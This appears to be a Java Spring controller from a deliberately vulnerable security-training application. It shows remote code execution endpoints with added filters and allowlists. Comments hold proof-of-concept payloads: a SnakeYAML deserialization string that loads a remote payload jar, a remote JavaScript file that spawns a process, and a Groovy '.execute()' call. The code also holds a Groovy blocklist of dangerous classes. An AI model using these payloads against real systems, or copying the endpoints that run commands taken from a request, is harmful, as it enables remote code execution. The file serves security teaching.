package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.joychou.security.SecurityUtil;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        if (cmd == null) {
            return "Command not allowed";
        }
        String[] parts = cmd.split("\\s+");
        for (String part : parts) {
            if (SecurityUtil.cmdFilter(part) == null) {
                return "Command not allowed";
            }
        }

        try {
            ProcessBuilder pb = new ProcessBuilder(parts);
            Process p = pb.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        if (cmd == null) {
            return "Command not allowed";
        }
        String[] parts = cmd.split("\\s+");
        for (String part : parts) {
            if (SecurityUtil.cmdFilter(part) == null) {
                return "Command not allowed";
            }
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(parts);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    private static final Set<String> ALLOWED_JS_HOSTS = Collections.unmodifiableSet(
            new HashSet<>(Arrays.asList("cdn.example.com", "static.example.com")));

    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // js nashorn javascript ecmascript
        if (jsurl == null || !SecurityUtil.isHttp(jsurl)) {
            throw new IllegalArgumentException("Only http/https URLs are allowed");
        }
        String host = SecurityUtil.gethost(jsurl);
        if (host == null || !ALLOWED_JS_HOSTS.contains(host)) {
            throw new IllegalArgumentException("URL host not in allowlist");
        }
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        bindings.remove("java");
        bindings.remove("javax");
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        SecureASTCustomizer secureASTCustomizer = new SecureASTCustomizer();
        secureASTCustomizer.setReceiversBlackList(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder",
                "java.lang.System", "java.lang.Class",
                "java.lang.reflect.Method", "java.lang.reflect.Field",
                "java.io.File", "java.io.FileInputStream",
                "java.io.FileOutputStream", "java.net.URL",
                "java.net.URLClassLoader", "java.net.Socket"
        ));
        secureASTCustomizer.setImportsBlacklist(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder",
                "java.lang.System", "java.io.File",
                "java.net.URL", "java.net.Socket"
        ));
        secureASTCustomizer.setIndirectImportCheckEnabled(true);
        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secureASTCustomizer);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

